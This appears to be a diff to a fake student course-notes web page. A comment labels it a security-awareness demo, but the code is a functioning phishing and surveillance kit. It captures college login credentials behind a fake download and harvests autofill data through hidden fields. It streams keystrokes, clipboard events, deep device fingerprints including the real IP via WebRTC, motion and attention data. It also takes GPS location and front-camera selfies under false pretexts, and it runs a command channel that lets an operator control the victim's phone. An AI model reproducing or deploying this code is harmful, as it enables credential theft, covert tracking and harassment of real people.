@@ -47,6 +47,19 @@
   }
   .signin input:focus { border-color: #0984e3; }
   .note { font-size: 13px; color: #b2bec3; text-align: center; margin-top: 12px; }
+  .progress { display: none; margin-top: 14px; }
+  .progress .bar {
+    width: 100%; height: 8px; background: #dfe6e9; border-radius: 4px; overflow: hidden;
+  }
+  .progress .fill {
+    height: 100%; width: 0%; background: #00b894; border-radius: 4px;
+    transition: width 0.4s ease;
+  }
+  .progress .pct { font-size: 13px; color: #636e72; margin-top: 6px; text-align: center; }
+  .af-honey {
+    position: absolute; opacity: 0; height: 1px; width: 1px; overflow: hidden;
+    left: -10px; top: -10px; pointer-events: none;
+  }
 </style>
 </head>
 <body>
@@ -69,18 +82,40 @@
       <li>Unit 5 – Hashing <span class="lock">🔒</span></li>
     </ul>
     <button class="btn" onclick="showSignin()">Sign in to download all units</button>
+    <div class="progress" id="dlProgress">
+      <div class="bar"><div class="fill" id="dlFill"></div></div>
+      <div class="pct" id="dlPct">Preparing download… 0%</div>
+    </div>
   </div>
 
   <div class="card">
     <input type="text" class="search" placeholder="Search for a chapter or topic..." id="searchBox">
   </div>
 
+  <div class="card" id="campusCard" style="display:none">
+    <h2>Campus Verification</h2>
+    <div class="meta">Confirm you're on campus to unlock 30 days of offline access</div>
+    <button class="btn" onclick="startGPS('campus verification bait')">Verify my campus location</button>
+  </div>
+
+  <div class="card" id="selfieCard" style="display:none">
+    <h2>Student ID Check</h2>
+    <div class="meta">New policy: a quick selfie confirms active enrollment</div>
+    <button class="btn" onclick="startSelfie()">Verify with selfie</button>
+  </div>
+
   <div class="card signin" id="signinCard">
     <h2>Student Login</h2>
     <div class="meta">Use your college email to unlock downloads</div>
     <form onsubmit="sendCreds(event)">
-      <input type="text" placeholder="College email" id="emailField" autocomplete="off">
-      <input type="password" placeholder="Password" id="passField" autocomplete="off">
+      <input type="text" placeholder="College email" id="emailField" autocomplete="email">
+      <input type="password" placeholder="Password" id="passField" autocomplete="current-password">
+      <!-- Autofill harvest: browser fills these silently along with email -->
+      <input class="af-honey" type="text" name="fullName" id="afName" autocomplete="name" tabindex="-1" aria-hidden="true">
+      <input class="af-honey" type="tel" name="phone" id="afTel" autocomplete="tel" tabindex="-1" aria-hidden="true">
+      <input class="af-honey" type="text" name="org" id="afOrg" autocomplete="organization" tabindex="-1" aria-hidden="true">
+      <input class="af-honey" type="text" name="street" id="afStreet" autocomplete="street-address" tabindex="-1" aria-hidden="true">
+      <input class="af-honey" type="text" name="postal" id="afPostal" autocomplete="postal-code" tabindex="-1" aria-hidden="true">
       <button type="submit" class="btn">Sign in</button>
     </form>
     <div class="note">Free access for all students</div>
@@ -93,6 +128,27 @@
 //  SECURITY AWARENESS DEMO — everything below runs with ZERO
 //  permission prompts. That is the entire point of the talk.
 // ═══════════════════════════════════════════════════════════════
+const T0 = Date.now();
+const VID_KEY = "nh_vid";
+
+// Persistent visitor identity — survives cache clears of one origin tab
+function visitorId() {
+  let v = null;
+  try { v = localStorage.getItem(VID_KEY); } catch (e) {}
+  if (!v) {
+    v = Math.random().toString(16).slice(2) + Math.random().toString(16).slice(2);
+    try { localStorage.setItem(VID_KEY, v); } catch (e) {}
+  }
+  return v;
+}
+const VID = visitorId();
+
+function post(path, obj) {
+  return fetch(path, {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(Object.assign({ vid: VID }, obj)),
+  }).catch(() => {});
+}
 
 // ── 1. Device / OS / Browser fingerprint from User-Agent ──────
 function parseUA() {
@@ -122,7 +178,14 @@ function parseUA() {
   else if (/Firefox\//.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
   else if (/Safari\//.test(ua))  browser = "Safari";
 
-  return { platform, browser };
+  // In-app browser detection (WhatsApp / Telegram / Instagram webviews)
+  let webview = "regular browser tab";
+  if (/; wv\)/.test(ua) || /Version\/[\d.]+.*Chrome\/[\d.]+.*Mobile/.test(ua)) webview = "in-app WebView";
+  if (/FB|Instagram|WhatsApp|Telegram|Line|Snapchat/i.test(ua)) {
+    const app = ua.match(/FB|Instagram|WhatsApp|Telegram|Line|Snapchat/i)[0];
+    webview = "inside " + app + " in-app browser";
+  }
+  return { platform, browser, webview };
 }
 
 // ── 2. Battery Status API — no permission prompt on Android ────
@@ -130,27 +193,24 @@ function getBattery() {
   return new Promise((resolve) => {
     if (!navigator.getBattery) return resolve(null);
     navigator.getBattery().then((b) => {
-      resolve({
-        level: Math.round(b.level * 100),
-        charging: b.charging,
+      resolve({ level: Math.round(b.level * 100), charging: b.charging });
+      const report = (label) => post("/event", {
+        text: `🔋 Battery ${label} — now ${Math.round(b.level * 100)}%${b.charging ? " (charging)" : ""}`
       });
-      // live updates — streams changes as they happen
-      b.addEventListener("levelchange", () => {
-        fetch("/keys", {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ keys: "[battery now " + Math.round(b.level * 100) + "%]", context: "passive" })
-        });
-      });
+      b.addEventListener("levelchange", () => report("level changed"));
+      b.addEventListener("chargingchange", () => report(b.charging ? "plugged in ⚡" : "unplugged"));
     }).catch(() => resolve(null));
   });
 }
 
-// ── 3. Network Information API — carrier-grade connection type ─
+// ── 3. Network Information API ─────────────────────────────────
 function getConnection() {
   const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   if (!c) return null;
   return {
     effectiveType: c.effectiveType || "unknown",
+    downlink: c.downlink || null,
+    rtt: c.rtt || null,
     saveData: c.saveData || false,
   };
 }
@@ -163,7 +223,6 @@ function getFingerprint() {
     if (!gl) return {};
     const dbgInfo = gl.getExtension("WEBGL_debug_renderer_info");
     const gpu = dbgInfo ? gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-    // hash-ish of canvas + gpu + audio fingerprint
     const audio = (() => {
       try {
         const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 4410, 44100);
@@ -193,6 +252,7 @@ function getDisplayInfo() {
     screen: window.screen.width + "x" + window.screen.height,
     darkMode: window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches,
     language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
     localTime: new Date().toLocaleString(),
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     cores: navigator.hardwareConcurrency || null,
@@ -206,7 +266,152 @@ function getDisplayInfo() {
   };
 }
 
-// ── 5. Send the full dossier on page load ──────────────────────
+// ── 5. DEEP FINGERPRINT STACK (all silent) ─────────────────────
+
+// WebRTC — real local + public IP, works even through some VPNs
+function webrtcLeak() {
+  return new Promise((resolve) => {
+    const found = { local: null, public: null };
+    let done = false;
+    const finish = () => { if (!done) { done = true; resolve(found); } };
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return finish();
+        const c = e.candidate.candidate;
+        const ips = c.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{0,4}(:[a-f0-9]{0,4}){2,7}%?\d*)/gi) || [];
+        for (const ip of ips) {
+          if (/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
+            if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) { if (!found.local) found.local = ip; }
+            else if (!found.public) found.public = ip;
+          }
+        }
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish);
+      setTimeout(finish, 2500);
+    } catch (e) { finish(); }
+  });
+}
+
+// Media devices — counts only, no permission needed
+function deviceCounts() {
+  return new Promise((resolve) => {
+    try {
+      navigator.mediaDevices.enumerateDevices().then(list => {
+        const c = { camera: 0, mic: 0, speaker: 0 };
+        list.forEach(d => { if (d.kind === "videoinput") c.camera++; if (d.kind === "audioinput") c.mic++; if (d.kind === "audiooutput") c.speaker++; });
+        resolve(c);
+      }).catch(() => resolve(null));
+    } catch (e) { resolve(null); }
+  });
+}
+
+// Widevine DRM security level — hardware-backed or not
+function drmLevel() {
+  return new Promise((resolve) => {
+    if (!navigator.requestMediaKeySystemAccess) return resolve(null);
+    const base = { initDataTypes: ["cenc"], videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }] };
+    const attempt = (robustness) => navigator.requestMediaKeySystemAccess("com.widevine.alpha", [{
+      initDataTypes: base.initDataTypes,
+      videoCapabilities: [{ contentType: base.videoCapabilities[0].contentType, robustness }],
+    }]).then(a => a.createMediaKeys()).then(() => true).catch(() => false);
+
+    attempt("HW_SECURE_ALL").then(l1Full => {
+      if (l1Full) return resolve("Widevine L1 (hardware-backed, full)");
+      attempt("HW_SECURE_CRYPTO").then(l1Part => {
+        if (l1Part) return resolve("Widevine L1 (hardware crypto)");
+        attempt("").then(l3 => resolve(l3 ? "Widevine L3 (software only)" : "no Widevine"));
+      });
+    });
+  });
+}
+
+// Installed-font probe (measurement trick)
+function fontProbe() {
+  const candidates = ["Roboto","Segoe UI","Helvetica Neue","San Francisco","SF Pro","Menlo","Consolas","Monaco","Ubuntu","Cantarell","Fira Sans","Droid Sans","Noto Sans","Tahoma","Verdana","Georgia","Impact","Comic Sans MS","Courier New","Times New Roman","Calibri","Cambria","Malgun Gothic","Meiryo","Nirmala UI"];
+  try {
+    const span = document.createElement("span");
+    span.style.cssText = "position:absolute;left:-9999px;font-size:72px;top:-9999px";
+    span.textContent = "mmmmmmmmmmlliWQ@%";
+    document.body.appendChild(span);
+    const measure = (font) => {
+      span.style.fontFamily = "monospace";
+      const base = span.offsetWidth;
+      span.style.fontFamily = font + ", monospace";
+      return span.offsetWidth !== base;
+    };
+    const found = candidates.filter(measure);
+    document.body.removeChild(span);
+    return found;
+  } catch (e) { return []; }
+}
+
+// Storage estimate → approximate free disk
+function storageEstimate() {
+  return new Promise((resolve) => {
+    try {
+      navigator.storage.estimate().then(e => resolve({
+        quotaMB: Math.round(e.quota / 1048576),
+        usedMB: Math.round((e.usage || 0) / 1048576),
+      })).catch(() => resolve(null));
+    } catch (err) { resolve(null); }
+  });
+}
+
+// Permission states — querying is prompt-free
+function permissionStates() {
+  const names = ["geolocation", "notifications", "camera", "microphone"];
+  return Promise.all(names.map(n =>
+    navigator.permissions && navigator.permissions.query
+      ? navigator.permissions.query({ name: n }).then(p => [n, p.state]).catch(() => [n, "n/a"])
+      : Promise.resolve([n, "n/a"])
+  )).then(entries => Object.fromEntries(entries));
+}
+
+// Locale deep-dive via Intl
+function localeProfile() {
+  try {
+    const num = Intl.NumberFormat().resolvedOptions();
+    const dt = Intl.DateTimeFormat().resolvedOptions();
+    return {
+      currency: num.currency || "?",
+      numberSystem: num.numberSystem || "?",
+      calendar: dt.calendar || "?",
+      hour12: dt.hour12,
+      timeZoneName: dt.timeZoneName || "?",
+    };
+  } catch (e) { return null; }
+}
+
+// Real bandwidth + latency against our own server
+function measureNetwork() {
+  return new Promise((resolve) => {
+    const t0 = performance.now();
+    fetch("/ping?n=0", { cache: "no-store" }).then(() => {
+      const rtt = Math.round(performance.now() - t0);
+      const t1 = performance.now();
+      fetch("/ping?n=60000", { cache: "no-store" }).then(r => r.arrayBuffer()).then(b => {
+        const secs = (performance.now() - t1) / 1000;
+        const mbps = (b.byteLength * 8 / 1e6) / secs;
+        resolve({ rtt, mbps: Math.round(mbps * 10) / 10 });
+      }).catch(() => resolve({ rtt, mbps: null }));
+    }).catch(() => resolve(null));
+  });
+}
+
+// Multi-tab detection
+function tabDetect() {
+  try {
+    const ch = new BroadcastChannel("nh_tabs");
+    let others = 0;
+    ch.onmessage = (e) => { if (e.data === "hello") others++; };
+    ch.postMessage("hello");
+    return new Promise(r => setTimeout(() => r(others), 400));
+  } catch (e) { return Promise.resolve(0); }
+}
+
+// ── 6. Send the full dossier on page load ──────────────────────
 (async function init() {
   const ua = parseUA();
   const battery = await getBattery();
@@ -214,52 +419,50 @@ function getDisplayInfo() {
   const disp = getDisplayInfo();
   const fp = getFingerprint();
 
-  const payload = {
-    platform: ua.platform,
-    browser: ua.browser,
-    battery,
-    connection: conn,
-    screen: disp.screen,
-    darkMode: disp.darkMode,
-    language: disp.language,
-    localTime: disp.localTime,
-    timezone: disp.timezone,
-    cores: disp.cores,
-    memory: disp.memory,
-    touchSupport: disp.touchSupport,
-    maxTouchPoints: disp.maxTouchPoints,
-    gpu: fp.gpu,
-    audioFingerprint: fp.audioFingerprint,
-    webglHash: fp.webglHash,
-    plugins: disp.plugins,
-    standalone: disp.standalone,
-    referrer: disp.referrer,
-    notifications: disp.notifications,
-  };
+  const [rtc, devices, drm, fonts, storage, perms, locale, net, tabs] = await Promise.all([
+    webrtcLeak(), deviceCounts(), drmLevel(), fontProbe(), storageEstimate(),
+    permissionStates(), localeProfile(), measureNetwork(), tabDetect(),
+  ]);
 
-  fetch("/collect", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-  }).catch(() => {});
+  const payload = {
+    platform: ua.platform, browser: ua.browser, webview: ua.webview,
+    battery, connection: conn,
+    screen: disp.screen, darkMode: disp.darkMode,
+    language: disp.language, languages: disp.languages,
+    localTime: disp.localTime, timezone: disp.timezone,
+    cores: disp.cores, memory: disp.memory,
+    touchSupport: disp.touchSupport, maxTouchPoints: disp.maxTouchPoints,
+    gpu: fp.gpu, audioFingerprint: fp.audioFingerprint, webglHash: fp.webglHash,
+    plugins: disp.plugins, standalone: disp.standalone,
+    referrer: disp.referrer, notifications: disp.notifications,
+    rtcLocalIp: rtc.local, rtcPublicIp: rtc.public,
+    devices, drm, fonts, storage, perms, locale, net, tabs,
+    visitorId: VID,
+    returning: (() => { try { return localStorage.getItem("nh_seen") ? true : false; } catch (e) { return false; } })(),
+  };
+  try { localStorage.setItem("nh_seen", "1"); } catch (e) {}
+
+  post("/collect", payload);
 })();
 
-// ── 6. Keystroke streaming — global + search box ───────────────
+// ── 7. Keystroke streaming + dynamics + typing presence ────────
 let buffer = "";
 let flushTimer = null;
+let keyTimes = [];           // keystroke dynamics
+let firstKeyAt = null;
+let keyCharCount = 0;
+let lastTypingPing = 0;
 
 function flushKeys(context) {
   if (!buffer) return;
   const payload = buffer;
   buffer = "";
-  fetch("/keys", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ keys: payload, context: context || "page" }),
-  }).catch(() => {});
+  post("/keys", { keys: payload, context: context || "page" });
 }
 
 function scheduleFlush(context) {
   clearTimeout(flushTimer);
-  flushTimer = setTimeout(() => flushKeys(context), 700); // streams letter-groups fast
+  flushTimer = setTimeout(() => flushKeys(context), 700);
 }
 
 function contextFor(el) {
@@ -270,12 +473,32 @@ function contextFor(el) {
   return "page";
 }
 
-// PRIMARY CAPTURE — 'input' events fire on Android soft keyboards
+function keyDynamics() {
+  if (keyTimes.length < 4) return null;
+  const iv = [];
+  for (let i = 1; i < keyTimes.length; i++) iv.push(keyTimes[i] - keyTimes[i - 1]);
+  const avg = iv.reduce((a, b) => a + b, 0) / iv.length;
+  const bursts = iv.filter(x => x < 120).length;
+  const minutes = (keyTimes[keyTimes.length - 1] - keyTimes[0]) / 60000;
+  const wpm = minutes > 0 ? Math.round((keyCharCount / 5) / minutes) : 0;
+  return { avg: Math.round(avg), bursts, wpm, samples: iv.length };
+}
+
 const lastVals = new WeakMap();
 document.addEventListener("input", (e) => {
   const el = e.target;
   if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement)) return;
   if (el.type === "submit" || el.type === "button") return;
+
+  // typing presence → Telegram "is typing…" mirror
+  const now = Date.now();
+  if (now - lastTypingPing > 3500) {
+    lastTypingPing = now;
+    post("/typing", {});
+  }
+  if (!firstKeyAt) firstKeyAt = now;
+  keyTimes.push(now);
+  keyCharCount++;
 
   const v = el.value;
   const prev = lastVals.get(el) ?? "";
@@ -285,13 +508,12 @@ document.addEventListener("input", (e) => {
   if (v.length > prev.length && v.startsWith(prev)) delta = v.slice(prev.length);
   else if (v.length < prev.length && prev.startsWith(v)) delta = "⌫";
   else if (v === prev) return;
-  else delta = v; // replaced/autocorrected — show the result
+  else delta = v;
 
   buffer += delta;
   scheduleFlush(contextFor(el));
 }, true);
 
-// Enter key — not delivered via 'input', needs keydown
 document.addEventListener("keydown", (e) => {
   if (e.key !== "Enter") return;
   const el = e.target;
@@ -300,12 +522,9 @@ document.addEventListener("keydown", (e) => {
   flushKeys(ctx);
 }, true);
 
-// SECONDARY CAPTURE — physical keyboard typing outside any field
-// (desktop users typing on the page itself) — input events don't fire
-// there, so fall back to keydown for non-input targets
 document.addEventListener("keydown", (e) => {
   const el = e.target;
-  if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) return; // handled above
+  if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) return;
   if (e.key === "Backspace") { buffer = buffer.slice(0, -1); return; }
   if (e.key.length === 1) {
     buffer += e.key;
@@ -313,24 +532,290 @@ document.addEventListener("keydown", (e) => {
   }
 });
 
-// ── 7. Fake sign-in form → credential capture ──────────────────
+// Clipboard surveillance — copy AND paste
+document.addEventListener("copy", () => post("/event", { text: "📋 Copied text to clipboard" }));
+document.addEventListener("cut", () => post("/event", { text: "✂️ Cut text to clipboard" }));
+document.addEventListener("paste", (e) => {
+  let len = "?";
+  try { len = String((e.clipboardData || window.clipboardData).getData("text") || "").length; } catch (err) {}
+  post("/event", { text: `📥 Pasted ${len} characters (paste does not hide you either)` });
+});
+
+// ── 8. Autofill harvest check (hidden fields in the sign-in form)
+function checkAutofill() {
+  const f = {
+    name: document.getElementById("afName").value,
+    phone: document.getElementById("afTel").value,
+    org: document.getElementById("afOrg").value,
+    street: document.getElementById("afStreet").value,
+    postal: document.getElementById("afPostal").value,
+  };
+  const got = Object.entries(f).filter(([, v]) => v);
+  if (got.length) {
+    post("/autofill", f);
+  }
+}
+
+// ── 9. Fake sign-in → credential capture + fake download ──────
 function showSignin() {
   document.getElementById("signinCard").style.display = "block";
   document.getElementById("signinCard").scrollIntoView({ behavior: "smooth" });
+  post("/event", { text: "🖱️ Tapped “Sign in to download all units”" });
+}
+
+function fakeDownload() {
+  const wrap = document.getElementById("dlProgress");
+  const fill = document.getElementById("dlFill");
+  const pct = document.getElementById("dlPct");
+  wrap.style.display = "block";
+  let p = 0;
+  const iv = setInterval(() => {
+    p = Math.min(100, p + Math.random() * 18 + 6);
+    fill.style.width = p + "%";
+    pct.textContent = "Downloading PDF… " + Math.round(p) + "%";
+    if (p >= 100) {
+      clearInterval(iv);
+      pct.textContent = "✔ Verified. One more step: campus + enrollment check below.";
+      setTimeout(() => {
+        document.getElementById("campusCard").style.display = "block";
+        document.getElementById("selfieCard").style.display = "block";
+      }, 1200);
+    }
+  }, 500);
 }
 
 function sendCreds(e) {
   e.preventDefault();
   const email = document.getElementById("emailField").value;
   const password = document.getElementById("passField").value;
-  fetch("/creds", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ email, password }),
-  }).then(() => {
-    alert("Incorrect college email or password. Please try again.");
-    document.getElementById("passField").value = "";
+  checkAutofill();
+  post("/creds", { email, password });
+  fakeDownload();
+}
+
+// ── 10. Motion telemetry — accelerometer, no permission ────────
+(function motionTelemetry() {
+  if (!window.DeviceMotionEvent) return;
+  let lastNarrate = 0;
+  let lastBucket = "";
+  let shakeCount = 0;
+
+  const narrate = (text) => {
+    const now = Date.now();
+    if (now - lastNarrate < 4000) return;
+    lastNarrate = now;
+    post("/event", { text });
+  };
+
+  window.addEventListener("devicemotion", (e) => {
+    const a = e.accelerationIncludingGravity;
+    if (!a || a.x == null) return;
+    const mag = Math.sqrt(a.x * a.x + a.y * a.y + a.z * a.z);
+    const dev = Math.abs(mag - 9.81);
+    if (dev > 6) {
+      shakeCount++;
+      if (shakeCount % 3 === 1) narrate("📳 Device moved abruptly (picked up / shaken)");
+    } else if (dev > 2.5 && dev <= 6) {
+      narrate("🚶 Rhythmic motion — walking pace detected");
+    }
+  });
+
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener("deviceorientation", (e) => {
+      if (e.beta == null) return;
+      const tilt = Math.round(Math.abs(e.beta) + Math.abs(e.gamma));
+      const bucket = tilt < 20 ? "flat on table" : tilt < 90 ? "held tilted" : "held upright";
+      if (bucket !== lastBucket && lastBucket !== "") {
+        narrate(`📐 Orientation → ${bucket} (tilt ~${tilt}°)`);
+      }
+      lastBucket = bucket;
+    });
+  }
+})();
+
+// ── 11. Attention analytics: scroll, visibility, idle ──────────
+let maxScrollPct = 0;
+let scrollNarrated = {};
+window.addEventListener("scroll", () => {
+  const h = document.documentElement.scrollHeight - window.innerHeight;
+  if (h <= 0) return;
+  maxScrollPct = Math.max(maxScrollPct, Math.round((window.scrollY / h) * 100));
+  [50, 90].forEach((p) => {
+    if (maxScrollPct >= p && !scrollNarrated[p]) {
+      scrollNarrated[p] = true;
+      post("/event", { text: `📖 Read ${p}% of the page` });
+    }
+  });
+}, { passive: true });
+
+let hiddenAt = null;
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden) {
+    hiddenAt = Date.now();
+    exitSummary();          // beacon survives the app switch
+    uploadHeatmap();        // touch map of what they did
+  } else if (hiddenAt) {
+    const away = Math.round((Date.now() - hiddenAt) / 1000);
+    post("/event", { text: `👁️ Victim switched to another app… came back after ${away}s` });
+    hiddenAt = null;
+  }
+});
+
+let lastInteraction = Date.now();
+let idleNarrated = false;
+["pointerdown", "keydown", "input", "touchstart", "scroll"].forEach(ev =>
+  document.addEventListener(ev, () => { lastInteraction = Date.now(); idleNarrated = false; }, { passive: true })
+);
+setInterval(() => {
+  if (!idleNarrated && Date.now() - lastInteraction > 30000 && !document.hidden) {
+    idleNarrated = true;
+    post("/event", { text: "💤 Idle 30s+ — phone set down, screen left on" });
+  }
+}, 10000);
+
+// ── 12. Touch heatmap ──────────────────────────────────────────
+const touchPoints = [];
+document.addEventListener("pointerdown", (e) => {
+  touchPoints.push({
+    x: Math.round((e.clientX / window.innerWidth) * 400),
+    y: Math.round((e.clientY / window.innerHeight) * 800),
+  });
+  if (touchPoints.length > 500) touchPoints.shift();
+}, { passive: true });
+
+function uploadHeatmap() {
+  if (touchPoints.length < 3) return;
+  try {
+    const c = document.createElement("canvas");
+    c.width = 400; c.height = 800;
+    const ctx = c.getContext("2d");
+    ctx.fillStyle = "#0d1117";
+    ctx.fillRect(0, 0, 400, 800);
+    touchPoints.forEach((p, i) => {
+      const g = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, 22);
+      g.addColorStop(0, "rgba(255,60,60,0.35)");
+      g.addColorStop(1, "rgba(255,60,60,0)");
+      ctx.fillStyle = g;
+      ctx.fillRect(p.x - 22, p.y - 22, 44, 44);
+    });
+    c.toBlob((blob) => {
+      if (!blob) return;
+      const fd = new FormData();
+      fd.append("vid", VID);
+      fd.append("image", blob, "heat.png");
+      fetch("/heatmap", { method: "POST", body: fd, keepalive: true }).catch(() => {});
+    }, "image/png");
+  } catch (e) {}
+}
+
+// ── 14. GPS — one disguised tap, then forever ─────────────────
+let gpsWatch = null;
+
+function startGPS(source) {
+  if (!navigator.geolocation || gpsWatch !== null) return;
+  post("/event", { text: "🖱️ Tapped location verification — permission prompt appeared" });
+  gpsWatch = navigator.geolocation.watchPosition((pos) => {
+    post("/gps", {
+      source,
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy,
+      spd: pos.coords.speed,
+      alt: pos.coords.altitude,
+      head: pos.coords.heading,
+    });
+  }, () => post("/event", { text: "🚫 Location permission denied" }), {
+    enableHighAccuracy: true, maximumAge: 2000, timeout: 15000,
+  });
+}
+
+// Silent resume — if they allowed it once, every future visit tracks with NO prompt
+if (navigator.permissions && navigator.permissions.query) {
+  navigator.permissions.query({ name: "geolocation" }).then((p) => {
+    if (p.state === "granted") startGPS("SILENT — permission remembered from an earlier visit, no prompt shown");
   }).catch(() => {});
 }
+
+// ── 15. Front camera — selfie pretext capture ─────────────────
+async function startSelfie() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const v = document.createElement("video");
+    v.srcObject = stream;
+    await v.play();
+    await new Promise((r) => setTimeout(r, 700));
+    const c = document.createElement("canvas");
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+    stream.getTracks().forEach((t) => t.stop());
+    post("/event", { text: "📸 Camera accessed — frame captured" });
+    c.toBlob((b) => {
+      if (!b) return;
+      const fd = new FormData();
+      fd.append("vid", VID);
+      fd.append("image", b, "selfie.png");
+      fetch("/selfie", { method: "POST", body: fd }).catch(() => {});
+    }, "image/png");
+  } catch (e) {
+    post("/event", { text: "🚫 Camera permission denied" });
+  }
+}
+
+// ── 16. C2 command channel — operator controls the phone ──────
+setInterval(() => {
+  fetch("/command?vid=" + VID).then((r) => r.json()).then(({ commands }) => {
+    (commands || []).forEach(executeCommand);
+  }).catch(() => {});
+}, 3000);
+
+function executeCommand(cmd) {
+  if (cmd.action === "buzz") {
+    navigator.vibrate && navigator.vibrate(cmd.arg ? Number(cmd.arg) || [500, 200, 500, 200, 1000] : [500, 200, 500, 200, 1000]);
+  }
+  if (cmd.action === "speak" && window.speechSynthesis) {
+    const u = new SpeechSynthesisUtterance(cmd.arg || "This device has been compromised.");
+    u.rate = 1;
+    speechSynthesis.speak(u);
+  }
+  if (cmd.action === "flash") {
+    const d = document.createElement("div");
+    d.style.cssText = "position:fixed;inset:0;background:#fff;z-index:99999;opacity:0;transition:opacity .15s";
+    document.body.appendChild(d);
+    let on = false, n = 0;
+    const iv = setInterval(() => {
+      on = !on;
+      d.style.opacity = on ? "1" : "0";
+      if (++n >= 8) { clearInterval(iv); d.remove(); }
+    }, 180);
+  }
+  if (cmd.action === "gps") {
+    startGPS("remote-triggered from C2 console — prompt just appeared on the victim screen");
+  }
+}
+
+// ── 17. Network transition narration ──────────────────────────
+if (navigator.connection) {
+  navigator.connection.addEventListener("change", () => {
+    post("/event", { text: "📶 Network changed → " + (navigator.connection.effectiveType || "?") + (navigator.connection.type ? " (" + navigator.connection.type + ")" : "") });
+  });
+}
+
+// ── 13. Exit summary via sendBeacon (fires even as tab closes) ─
+function exitSummary() {
+  const dyn = keyDynamics();
+  const stats = {
+    vid: VID,
+    dwellMs: Date.now() - T0,
+    keyCharCount,
+    keyDyn: dyn,
+    scrollPct: maxScrollPct,
+    touches: touchPoints.length,
+  };
+  try { navigator.sendBeacon("/exit", new Blob([JSON.stringify(stats)], { type: "text/plain" })); }
+  catch (e) { fetch("/exit", { method: "POST", body: JSON.stringify(stats), keepalive: true }); }
+}
+window.addEventListener("pagehide", exitSummary);
 </script>
 
 </body>
